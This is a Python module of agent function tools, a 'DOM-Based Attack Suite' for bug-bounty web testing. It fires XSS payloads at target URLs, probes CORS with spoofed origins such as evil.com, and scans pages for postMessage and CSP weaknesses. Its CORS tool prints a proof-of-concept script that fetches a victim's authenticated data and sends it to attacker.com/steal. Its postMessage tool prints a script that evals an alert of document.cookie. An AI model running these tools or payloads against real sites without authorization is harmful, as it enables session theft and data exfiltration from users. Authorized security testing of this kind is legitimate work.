"""
DOM-Based Attack Suite
Tests client-side vulnerabilities that scanners miss:
- DOM-based XSS (sources/sinks in JavaScript)
- postMessage attack surface (cross-origin message injection)
- DOM Clobbering (HTML injection overriding DOM properties)
- Prototype Pollution (server-side and client-side)
- Client-side path traversal / template injection
- CSP bypass techniques evaluation

These vulnerabilities are highly valuable in bug bounty because
automated scanners (Burp, ZAP) rarely detect them reliably.
"""

import json
import requests
from src.sdk.core import function_tool

# Common DOM XSS sources (user-controlled inputs)
DOM_XSS_SOURCES = [
    "location.href", "location.hash", "location.search", "location.pathname",
    "document.referrer", "document.URL", "document.documentURI",
    "document.baseURI", "window.name",
    "postMessage", "localStorage", "sessionStorage",
]

# Common DOM XSS sinks (where execution happens)
DOM_XSS_SINKS = [
    "eval(", "innerHTML", "outerHTML", "document.write(", "document.writeln(",
    "execScript(", "setTimeout(", "setInterval(", ".src =", "location =",
    "location.href =", "location.replace(", "location.assign(",
    "$.html(", ".html(", "Vue.compile(", "angular.element(",
    "insertAdjacentHTML", "insertAdjacentElement",
]


@function_tool()
def dom_xss_probe(
    target_url: str,
    test_payloads: str = ""
):
    """
    Probe for DOM-based XSS by injecting payloads into URL hash/search/path
    and checking if the response JavaScript reflects them into dangerous sinks.
    (Note: Full DOM XSS requires a real browser — use browser_xss_test for JS execution)

    Args:
        target_url: URL to test (e.g. https://example.com/page)
        test_payloads: Comma-separated custom payloads (leave empty for defaults)
    """
    results = [f"[DOM-XSS] Probing DOM XSS attack surface: {target_url}"]

    # DOM XSS payloads targeting hash/query injection
    default_payloads = [
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "\"><script>alert(1)</script>",
        "'-alert(1)-'",
        "${alert(1)}",
        "{{7*7}}",
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        "data:text/html,<script>alert(1)</script>",
    ]

    custom = [p.strip() for p in test_payloads.split(",") if p.strip()]
    payloads = custom or default_payloads

    results.append("\n[Phase 1] Checking JavaScript for dangerous sources/sinks in page:")
    try:
        resp = requests.get(target_url, verify=False, timeout=10,
                            headers={"User-Agent": "Mozilla/5.0"})
        js_content = resp.text

        # Check for dangerous JavaScript patterns
        found_sources = [s for s in DOM_XSS_SOURCES if s in js_content]
        found_sinks = [s for s in DOM_XSS_SINKS if s in js_content]

        if found_sources:
            results.append(f"[SOURCES FOUND] {found_sources}")
        if found_sinks:
            results.append(f"[SINKS FOUND] {found_sinks}")
        if found_sources and found_sinks:
            results.append("⚡ Source-to-sink path possible — investigate JavaScript manually")
    except Exception as e:
        results.append(f"[ERROR] Could not fetch page: {e}")

    results.append("\n[Phase 2] Injecting payloads into URL parameters:")
    import urllib.parse

    vuln_indicators = []
    for payload in payloads[:6]:
        encoded = urllib.parse.quote(payload)

        test_urls = [
            f"{target_url}#{encoded}",
            f"{target_url}?q={encoded}",
            f"{target_url}?redirect={encoded}",
            f"{target_url}?next={encoded}",
            f"{target_url}?url={encoded}",
        ]

        for test_url in test_urls[:2]:
            try:
                resp = requests.get(test_url, verify=False, timeout=8,
                                    headers={"User-Agent": "Mozilla/5.0"})
                if payload in resp.text or urllib.parse.unquote(encoded) in resp.text:
                    vuln_indicators.append((test_url, payload))
                    results.append(f"[REFLECTED] {payload[:40]} in response at: {test_url}")
            except Exception:
                pass

    results.append(f"\n{'='*60}")
    if vuln_indicators:
        results.append(f"⚠️  {len(vuln_indicators)} payloads reflected — validate with browser_xss_test for actual DOM execution")
    else:
        results.append("No server-side reflection — DOM XSS may still exist in JavaScript (requires browser)")
    results.append("Use browser_xss_test for real DOM execution verification")

    return "\n".join(results)


@function_tool()
def postmessage_attack_probe(
    target_url: str
):
    """
    Analyze a page for postMessage attack surface.
    Detects insecure message event listeners with weak origin validation.

    Args:
        target_url: URL of the page to analyze
    """
    results = [f"[POSTMESSAGE] Analyzing postMessage attack surface: {target_url}"]

    try:
        resp = requests.get(target_url, verify=False, timeout=10,
                            headers={"User-Agent": "Mozilla/5.0"})
        js_content = resp.text
    except Exception as e:
        return f"[ERROR] Could not fetch page: {e}"

    # Detect postMessage usage patterns
    patterns = [
        ("addEventListener.*message", "Message listener detected"),
        ("window.addEventListener.*postMessage", "postMessage listener"),
        ("onmessage", "onmessage handler"),
        ("postMessage\\(", "postMessage call (outgoing)"),
        ("e\\.origin", "Origin check present"),
        ("event\\.origin", "Origin check present"),
        ("\\*", "Wildcard target origin used in postMessage"),
        ("allowedOrigins", "Origin whitelist detected"),
    ]

    import re
    found_patterns = []
    for pattern, description in patterns:
        matches = re.findall(pattern, js_content, re.IGNORECASE)
        if matches:
            found_patterns.append((description, len(matches)))
            results.append(f"[FOUND] {description}: {len(matches)} occurrence(s)")

    # Check for dangerous patterns
    has_listener = any("listener" in p[0].lower() or "handler" in p[0].lower() for p in found_patterns)
    has_origin_check = any("origin check" in p[0].lower() for p in found_patterns)
    has_wildcard = any("wildcard" in p[0].lower() for p in found_patterns)

    results.append("\n[Analysis]")
    results.append(f"  Has message listener: {has_listener}")
    results.append(f"  Has origin validation: {has_origin_check}")
    results.append(f"  Has wildcard postMessage: {has_wildcard}")

    if has_listener and not has_origin_check:
        results.append("\n⚠️  MISSING ORIGIN VALIDATION in postMessage handler!")
        results.append("PoC Attack:")
        results.append(f"""<script>
  var target = window.open('{target_url}');
  setTimeout(function() {{
    target.postMessage('{{\"action\":\"eval\",\"code\":\"alert(document.cookie)\"}}', '*');
  }}, 1000);
</script>""")
    elif has_wildcard:
        results.append("\n⚠️  postMessage sent to '*' target — all origins can receive sensitive data")

    return "\n".join(results)


@function_tool()
def cors_exploit_probe(
    target_url: str,
    authenticated_headers: str = "{}",
    attacker_origin: str = "https://evil.com"
):
    """
    Deep CORS misconfiguration probe — goes beyond detection to prove
    credential-based data access from an attacker origin.

    Args:
        target_url: API endpoint to probe
        authenticated_headers: JSON string of auth headers (cookie/bearer)
        attacker_origin: Origin to test (default: https://evil.com)
    """
    try:
        hdrs = json.loads(authenticated_headers)
    except Exception:
        hdrs = {}

    results = [f"[CORS-EXPLOIT] Probing CORS exploit surface: {target_url}"]

    test_origins = [
        attacker_origin,
        "null",
        "https://evil.com.trusted-site.com",
        "https://trusted-site.com.evil.com",
        attacker_origin.replace("https://", "http://"),
        "https://notevil.com",
        f"https://{target_url.split('/')[2]}.evil.com",
    ]

    exploitable = []

    for origin in test_origins:
        test_hdrs = {**hdrs, "Origin": origin}
        try:
            resp = requests.get(target_url, headers=test_hdrs, verify=False, timeout=10)
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "")

            if acao == "*":
                results.append(f"[WEAK] Origin={origin}: ACAO: * (no credentials allowed)")
            elif origin in acao or acao == "null":
                results.append(f"[MATCH] Origin={origin} reflected in ACAO: {acao}")
                if acac.lower() == "true":
                    exploitable.append((origin, acao))
                    results.append("  ⚠️  EXPLOITABLE: ACAO reflects origin AND ACAC: true!")
                    results.append(f"  HTTP {resp.status_code}, Response: {resp.text[:100]}")
            else:
                results.append(f"[OK] Origin={origin}: ACAO={acao or '(none)'}")
        except Exception as e:
            results.append(f"[ERROR] Origin={origin}: {e}")

    results.append(f"\n{'='*60}")
    if exploitable:
        results.append(f"⚠️  CORS EXPLOIT CONFIRMED: {len(exploitable)} origins can steal authenticated data")
        for origin, acao in exploitable:
            results.append(f"  Origin: {origin}")
        results.append("\nPoC JavaScript (host on attacker.com):")
        results.append(f"""<script>
fetch('{target_url}', {{
  credentials: 'include',
  headers: {{ 'Origin': '{exploitable[0][0]}' }}
}})
.then(r => r.text())
.then(data => fetch('https://attacker.com/steal?d=' + encodeURIComponent(data)));
</script>""")
    else:
        results.append("No exploitable CORS misconfiguration with credentials found")

    return "\n".join(results)


@function_tool()
def csp_bypass_analysis(target_url: str):
    """
    Analyze Content Security Policy headers for bypass opportunities.
    Common CSP bypasses: unsafe-inline, unsafe-eval, whitelisted CDNs with user content,
    base-uri missing, object-src missing, JSONP endpoints on whitelisted domains.

    Args:
        target_url: URL to fetch and analyze CSP from
    """
    results = [f"[CSP-ANALYZE] Analyzing CSP at: {target_url}"]

    try:
        resp = requests.get(target_url, verify=False, timeout=10)
        csp = resp.headers.get("Content-Security-Policy", "")
        csp_ro = resp.headers.get("Content-Security-Policy-Report-Only", "")
    except Exception as e:
        return f"[ERROR] {e}"

    if not csp and not csp_ro:
        results.append("⚠️  NO CSP HEADER found — XSS execution unrestricted!")
        return "\n".join(results)

    active_csp = csp or csp_ro
    mode = "Report-Only (NOT enforced!)" if csp_ro and not csp else "Enforced"
    results.append(f"[CSP] Mode: {mode}")
    results.append(f"[CSP] Policy:\n{active_csp}\n")

    # Parse directives
    directives = {}
    for part in active_csp.split(";"):
        part = part.strip()
        if " " in part:
            key, val = part.split(" ", 1)
            directives[key.strip()] = val.strip()
        elif part:
            directives[part] = ""

    issues = []

    # Check unsafe-inline
    for directive in ["script-src", "default-src"]:
        if directive in directives:
            if "'unsafe-inline'" in directives[directive]:
                issues.append(f"⚠️  'unsafe-inline' in {directive} — XSS payloads execute directly")
            if "'unsafe-eval'" in directives[directive]:
                issues.append(f"⚠️  'unsafe-eval' in {directive} — eval() is allowed")
            if "data:" in directives[directive]:
                issues.append(f"⚠️  data: URI allowed in {directive} — can be used for XSS")

    # Missing critical directives
    if "base-uri" not in directives:
        issues.append("⚠️  Missing base-uri — base tag injection possible (code injection via nonce reuse)")
    if "object-src" not in directives and "default-src" not in directives:
        issues.append("⚠️  Missing object-src — Flash/Java object injection possible")

    # Check for bypassable CDN whitelist
    bypassable_domains = [
        "cdn.jsdelivr.net",  # Can host JSONP/scripts from packages
        "cdnjs.cloudflare.com",
        "ajax.googleapis.com",
        "code.jquery.com",
        "*.blob.core.windows.net",  # Azure Blob user-controlled
        "storage.googleapis.com",
        "*.s3.amazonaws.com",
    ]

    all_sources = " ".join(directives.values())
    for domain in bypassable_domains:
        base = domain.replace("*.", "")
        if base in all_sources or domain in all_sources:
            issues.append(f"⚠️  Whitelisted CDN with potential user content: {domain}")

    # Wildcard domains
    import re
    wildcards = re.findall(r'\*\.[a-zA-Z0-9.-]+', all_sources)
    for wc in wildcards:
        issues.append(f"⚠️  Wildcard in CSP: {wc} — all subdomains trusted (if one is XSS-able, CSP broken)")

    results.append("[CSP Analysis Results]")
    if issues:
        for issue in issues:
            results.append(f"  {issue}")
        results.append(f"\n  Total issues: {len(issues)}")
    else:
        results.append("  CSP appears well-configured — no obvious bypasses found")

    results.append("\n[Next Steps]")
    results.append("1. Check for JSONP endpoints on whitelisted domains")
    results.append("2. Look for Angular/React app with DOMPURIFY bypass")
    results.append("3. Try nonce prediction if nonces are sequential")

    return "\n".join(results)
